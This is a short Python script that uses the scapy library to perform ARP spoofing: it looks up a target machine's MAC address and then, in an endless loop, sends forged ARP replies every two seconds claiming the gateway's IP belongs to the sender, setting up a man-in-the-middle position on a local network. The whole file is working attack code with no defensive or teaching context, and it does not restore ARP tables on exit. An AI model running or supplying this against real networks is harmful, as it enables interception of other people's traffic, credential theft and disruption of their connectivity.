import scapy.all as scapy
import time

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = broadcast / arp_request
        answered_list = scapy.srp(arp_packet, timeout=2, verbose=False)[0]
        return answered_list[0][1].hwsrc if answered_list else None
    except:
        return None

def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not get MAC for {target_ip}. Exiting...")
        return
    print(f"Spoofing {spoof_ip} to {target_ip} (MAC: {target_mac})...")
    try:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, iface=interface, verbose=False)
        print(f"Sent ARP reply: {spoof_ip} is at {packet.hwsrc}")
    except Exception as e:
        print(f"Error sending ARP packet: {e}")

interface = "Ethernet"  # Change to your interface 
target_ip = "192.168.1.4"  # Target device to trick
spoof_ip = "192.168.1.1"  # IP to spoof (e.g., gateway)
print(f"Starting ARP spoofing on {interface}...")
try:
    while True:
        spoof(target_ip, spoof_ip, interface)
        time.sleep(2)  # Send every 2 seconds
except KeyboardInterrupt:
    print("\n Stopping ARP spoofing...")
except Exception as e:
    print(f"Error: {e}")